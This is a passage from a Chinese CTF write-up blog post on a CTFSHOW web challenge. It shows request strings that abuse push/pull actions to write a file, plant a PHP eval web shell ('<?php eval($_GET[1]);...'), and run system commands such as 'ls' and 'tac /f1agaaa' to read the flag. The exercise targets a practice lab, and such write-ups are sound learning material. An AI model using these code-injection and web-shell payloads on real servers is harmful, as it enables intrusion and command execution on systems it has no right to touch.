<span class="line"><span style="color:#d4d4d4">&lt;!-- </span><span style="color:#4ec9b0">After</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">that</span><span style="color:#d4d4d4">,</span><span style="color:#4ec9b0">delete</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">the</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">robots</span><span style="color:#d4d4d4">.</span><span style="color:#4ec9b0">txt！</span><span style="color:#d4d4d4">--&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;/</span><span style="color:#4ec9b0">html</span><span style="color:#d4d4d4">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4ec9b0">hacker</span><span style="color:#d4d4d4">!</span></span></code></pre></div></div></figure><p>其实到这一步发现地址栏中 action 值变成了 test，那么也就是说可以不用修改按钮直接观察 get 传参方式，进行修改传参也可，例如：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">?input=eJwNkze2o0AABA9EAAI0gmADGGEGEE74DI%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">Fw3p1%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">B%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">FwX69euqzpVDJ2a%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">FGkWO4z4QQpnTUq9P5fFd3Uu%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">BYvM2ht%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">BZXSvYiLXq0o8zaUZ%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">FKSKHeeauPge1HS1rQOaCRvmX5oevKRQajpkc1lMgFhD9uJCH4CSDtZnx8zALzJLhLR2K%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">BWAbhIjf62yY9EFNAfOklJvHScguku8Y5yhtuZSeNGY1vr%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">BNHn6Jn3MYCnm%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">Fz9GbI9TH0XZfPPoqqZRrKo48Gdz%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">BodPf29M09uAXmYMftuX5lbIg586dsj8IPGvx3sRUZROiNLXSiM4s1dil6jpvB8cst8uk6ftkZcIF9tF4N0l7mIhew6On6LVPiWk7YaFYcBSI%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">BCLjlUx0heeixgqiWcRtNyHMfs64sx7oVEPY4ZVZg%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">FEmgnR%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">Bx6othXTZ2ZGQsEYvRa%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">FU1LaK%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">F4D7Op3ZKrKFnzAs01qSCbbf%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">BP097nH5uUElYiGbytryRvxAe4t1V5PA2dkKlweEANhJ%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">BDU5vzz0%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">BdoHA%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">B3opUlU80ol9Ghxas7B3bayW892QCULlB3LuNEEaS2mp1LoXm8dTJAZgM3BGfCHNYbkODF0DqNXrFCMswdFjb9cCnMokKdNZnLUubhW0yA4h807ywaHFZvPxCuG05XdxV6nLiZapgdgHjFpXFbnrwz9LIzLCGMw%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">BF7BHMJPheaGD3faUo71nCiV6QWQu0VW%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">FO2DvG%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">Beubaq5t1a5Y3tYJmti6soht26kuF7jUUg%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">BvZz3guJPIhqEvujvCubvp9WFznqRBETu6RM8yssRUdkXOcelo3bvnM3onXcf9%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">BkQvcSUbuwuEnWHYzn16%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">FewTo%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">BgVIqv0%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">BDNJC0YUGs9kWnS2%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">B1sAvpdp6qe46VGHNv5Ehm8XNg9SPQyrFYwqRuQZZ%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">Fr2muD0WE4G5qRRQ8dnmkgxTVF7Zh61%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">Fyvmis14AVf3UwjoHywgVs7MNevg%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">FtCL4JwsgHx6FLo0CANOoThXQcpMmu1ZcY%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">BMB7L5c4S%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">B5arvpFKn%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">FGN4KvCEWYZ%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">Br7inzI%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">Bng3O1T0eaaqFmy63HfCz4xYWYn4PFjC7ukhBJfY7E%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">BfPm6bO7%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">FjSe%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">B2SuGuZ5Crxj8yPiLLA1h61snzuxvqfM0ulqNmp%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">FSzwQLyo5N5HVZEVzMdqY7RiEqT6%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">FFOLji7N%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">F7E3c%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">B8ZLOGGQcDJMM5FARuDOfYyh09%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">BM%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">BI1Hdc%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">BbCze4S0TuOa3j7orHPzP%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">FBLQQLKt6c4cLZ42QbgJwmpowDmVjo%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">FR6dyCuJbWwKGS8BVtzxfh2YhYu%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">Br1n7mrY7nPTxszI6w%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">FTWAErJEBVZwXlj33RDqfi%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">Bu45uVP292vZOCDP0RHKuVL20QeMwhqsY47fQ7ZuLeKP%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">F9%</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">Bw8pT7oT</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">action=test</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">output=</span></span></code></pre></div></div></figure><p>回到主线。根据这个源码的 switch 函数里面的两个切入点进行构建，这里的第二个 case 点是用来构建恶意代码文件的，然后第一个 case 可以用来进行一个读取。这里先进行第二个文件的构建：</p><p>push:</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">?action=push</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">output=</span><span style="color:#dcdcaa">system</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'ls'</span><span style="color:#d4d4d4">);</span></span></code></pre></div></div></figure><p>计算 md5 值：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"><span style="color:#d4d4d4">	</span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">md5</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'system('</span><span style="color:#d4d4d4">ls</span><span style="color:#ce9178">');'</span><span style="color:#d4d4d4">.</span><span style="color:#ce9178">'youyou'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure><p>得到文件名：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#b5cea8">09</span><span style="color:#d4d4d4">a01bc41e5e2c8b3e47cc16869171fb</span></span></code></pre></div></div></figure><p>push 成功之后进行 pull 传参：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">?action=pull</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">input=</span><span style="color:#b5cea8">09</span><span style="color:#d4d4d4">a01bc41e5e2c8b3e47cc16869171fb</span></span></code></pre></div></div></figure><p>得到目录文件有：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211252312601.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221125231259495"></p><p>说明思路是对的。这之后更换非法语句即可。</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">push：?action=push</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">output=&lt;?php </span><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">]);</span><span style="color:#dcdcaa">phpinfo</span><span style="color:#d4d4d4">();?&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">pull：?action=pull</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">input=</span><span style="color:#b5cea8">8</span><span style="color:#d4d4d4">d42ec7469dcadc5679dce59d7a27342</span></span>
<span class="line"><span style="color:#6a9955">// input的值是md5('&lt;?php eval($_GET[1]);phpinfo();</span><span style="color:#d4d4d4">?&gt;</span><span style="color:#ce9178">'.'</span><span style="color:#d4d4d4">youyou</span><span style="color:#ce9178">')</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211252324510.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221125232430428"></p><p>tac 一手就可以了：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">?action=pull</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">input=</span><span style="color:#b5cea8">8</span><span style="color:#d4d4d4">d42ec7469dcadc5679dce59d7a27342&amp;</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">=</span><span style="color:#dcdcaa">system</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'tac /f1agaaa'</span><span style="color:#d4d4d4">);</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211252325394.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221125232516295"></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script></div><hr><div><div class="post-metas my-3"><div class="post-meta mr-3 d-flex align-items-center"><i class="iconfont icon-category"></i> <span class="category-chains"><span class="category-chain"><a href="/categories/WP/" class="category-chain-item">CTF-WP</a></span></span></div><div class="post-meta"><i class="iconfont icon-tags"></i> <a href="/tags/CTF-WP/" class="print-no-link">#CTF-WP</a></div></div><div class="license-box my-3"><div class="license-title"><div>CTFSHOW-WEB-WP（未完结）</div><div>https://4rozen.github.io/archives/WP/55980.html</div></div><div class="license-meta"><div class="license-meta-item"><div>作者</div><div>4rozeN</div></div><div class="license-meta-item license-meta-date"><div>发布于</div><div>2023年3月25日</div></div><div class="license-meta-item"><div>许可协议</div><div><a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"><span class="hint--top hint--rounded" aria-label="BY - 署名"><i class="iconfont icon-cc-by"></i> </span></a><a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"><span class="hint--top hint--rounded" aria-label="NC - 非商业性使用"><i class="iconfont icon-cc-nc"></i></span></a></div></div></div><div class="license-icon iconfont"></div></div><div class="post-prevnext my-3"><article class="post-prev col-6"><a href="/archives/notes/22192.html" title="使用 python 创建简易的 http 服务传递文件"><i class="iconfont icon-arrowleft"></i> <span class="hidden-mobile">使用 python 创建简易的 http 服务传递文件</span> <span class="visible-mobile">上一篇</span></a></article><article class="post-next col-6"><a href="/archives/notes/55208.html" title="解决 hexo 主题无法显示使用相对路径的图床图片"><span class="hidden-mobile">解决 hexo 主题无法显示使用相对路径的图床图片</span> <span class="visible-mobile">下一篇</span> <i class="iconfont icon-arrowright"></i></a></article></div></div><article id="comments" lazyload><div id="giscus" class="giscus"></div><script type="text/javascript">Fluid.utils.loadComments("#giscus",(function(){var t={repo:"4rozeN/4rozeN.github.io","repo-id":"R_kgDOMN8x0A",category:"General","category-id":"DIC_kwDOMN8x0M4CjtvK","theme-light":"light","theme-dark":"dark",mapping:"pathname","reactions-enabled":"1","emit-metadata":"1","input-position":"top",lang:"zh-CN",strict:"warn",theme:"dark",loading:"lazy",crossorigin:"anonymous"},e={};for(let i in t){if(!i.startsWith("theme-"))e[i.startsWith("data-")?i:"data-"+i]=t[i]}window.GiscusThemeLight="light",window.GiscusThemeDark="dark",e["data-theme"]="dark"===document.documentElement.getAttribute("data-user-color-scheme")?"dark":"light";for(let t in e){var i=e[t];null!=i&&""!==i||delete e[t]}var a=document.createElement("script");a.setAttribute("src","https://giscus.app/client.js"),a.setAttribute("crossorigin","anonymous");for(let t in e)a.setAttribute(t,e[t]);var n=document.getElementsByTagName("script"),r=n.length>0?n[n.length-1]:document.head||document.documentElement;r.parentNode.insertBefore(a,r.nextSibling)}))</script><noscript>Please enable JavaScript to view the comments</noscript></article></article></div></div></div><div class="side-col d-none d-lg-block col-lg-2"><aside class="sidebar" style="margin-left:-1rem"><div id="toc"><p class="toc-header"><i class="iconfont icon-list"></i> <span>目录</span></p><div class="toc-body" id="toc-body"></div></div></aside></div></div></div><a id="scroll-top-button" aria-label="TOP" href="#" role="button"><i class="iconfont icon-arrowup" aria-hidden="true"></i></a><div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true"><div class="modal-dialog modal-dialog-scrollable modal-lg" role="document"><div class="modal-content"><div class="modal-header text-center"><h4 class="modal-title w-100 font-weight-bold">搜索</h4><button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button></div><div class="modal-body mx-3"><div class="md-form mb-5"><input type="text" id="local-search-input" class="form-control validate"> <label data-error="x" data-success="v" for="local-search-input">关键词</label></div><div class="list-group" id="local-search-result"></div></div></div></div></div></main><footer><div class="footer-inner"><div class="footer-content"><a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a><br><div><span id="timeDate">载入天数…</span> <span id="times">载入时分秒…</span><script src="/js/duration.js"></script></div></div></div></footer><script src="https://fastly.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css"><script>NProgress.configure({showSpinner:!0,trickleSpeed:100}),NProgress.start(),window.addEventListener("load",(function(){NProgress.done()}))</script><script src="https://fastly.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script><script src="https://fastly.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js"></script><script src="/js/events.js"></script><script src="/js/plugins.js"></script><script src="https://fastly.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js"></script><script>!function(t,e){var i=Fluid.plugins.typing,n=e.getElementById("subtitle");n&&i&&i(n.getAttribute("data-typed-text"))}(window,document)</script><script src="/js/img-lazyload.js"></script><script>Fluid.utils.createScript("https://fastly.jsdelivr.net/npm/tocbot@4.12.2/dist/tocbot.min.js",(function(){var t=jQuery("#toc");if(0!==t.length&&window.tocbot){var i=jQuery("#board-ctn").offset().top;window.tocbot.init(Object.assign({tocSelector:"#toc-body",contentSelector:".markdown-body",linkClass:"tocbot-link",activeLinkClass:"tocbot-active-link",listClass:"tocbot-list",isCollapsedClass:"tocbot-is-collapsed",collapsibleClass:"tocbot-is-collapsible",scrollSmooth:!0,includeTitleTags:!0,headingsOffset:-i},CONFIG.toc)),t.find(".toc-list-item").length>0&&t.css("visibility","visible"),Fluid.events.registerRefreshCallback((function(){if("tocbot"in window){tocbot.refresh();var t=jQuery("#toc");if(0===t.length||!tocbot)return;t.find(".toc-list-item").length>0&&t.css("visibility","visible")}}))}}))</script><script src="https://fastly.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js"></script><script>Fluid.plugins.codeWidget()</script><script>Fluid.utils.createScript("https://fastly.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js",(function(){window.anchors.options={placement:CONFIG.anchorjs.placement,visible:CONFIG.anchorjs.visible},CONFIG.anchorjs.icon&&(window.anchors.options.icon=CONFIG.anchorjs.icon);var n=(CONFIG.anchorjs.element||"h1,h2,h3,h4,h5,h6").split(","),o=[];for(var s of n)o.push(".markdown-body > "+s.trim());"left"===CONFIG.anchorjs.placement&&(window.anchors.options.class="anchorjs-link-left"),window.anchors.add(o.join(", ")),Fluid.events.registerRefreshCallback((function(){if("anchors"in window){anchors.removeAll();var n=(CONFIG.anchorjs.element||"h1,h2,h3,h4,h5,h6").split(","),o=[];for(var s of n)o.push(".markdown-body > "+s.trim());"left"===CONFIG.anchorjs.placement&&(anchors.options.class="anchorjs-link-left"),anchors.add(o.join(", "))}}))}))</script><script>Fluid.utils.createScript("https://fastly.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js",(function(){Fluid.plugins.fancyBox()}))</script><script>Fluid.plugins.imageCaption()</script><script src="/js/local-search.js"></script><script src="/js/sign.js"></script><script src="/js/watch.js"></script><script src="/js/scrollAnimation.js"></script><script src="/js/backgroundize.js"></script><script src="/js/boot.js"></script><noscript><div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div></noscript><script src="https://cdn.jsdelivr.net/npm/hexo-shiki-plugin@latest/lib/codeblock.js"></script><script>const CODE_CONFIG={beautify:!0,highlightCopy:!0,highlightLang:!0,highlightHeightLimit:360,isHighlightShrink:!1,copy:{success:"复制成功",error:"复制失败",noSupport:"浏览器不支持复制功能"}};console.log("%c hexo-shiki-plugin %c v1.0.27 %c https://github.com/nova1751/hexo-shiki-plugin","color: #fff; background: #5f5f5f","color: #fff; background: #80c8f8","")</script><script src="/js/backgroundize.js"></script></body></html>